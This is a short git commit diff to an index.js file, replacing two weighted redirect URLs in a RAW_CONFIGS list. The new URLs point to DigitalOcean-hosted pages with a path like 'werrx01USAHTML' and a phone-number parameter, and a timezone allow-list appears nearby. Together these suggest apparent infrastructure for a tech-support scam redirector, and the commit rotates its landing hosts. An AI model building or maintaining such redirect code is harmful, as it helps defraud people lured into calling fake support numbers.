b0637b0a1b20395c7805fa65d186e2adeffae198
paalakash <palaksh452@gmail.com>
2026-06-10 09:48:51 +0530

    Replace URLs in RAW_CONFIGS
    Updated RAW_CONFIGS with new URLs for selection.

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://urchin-app-2imdh.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 },
-    { url: "https://urchin-app-2imdh.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 }
+    { url: "https://whale-app-dr7rv.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 },
+    { url: "https://whale-app-dr7rv.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 }
 
 ];
 
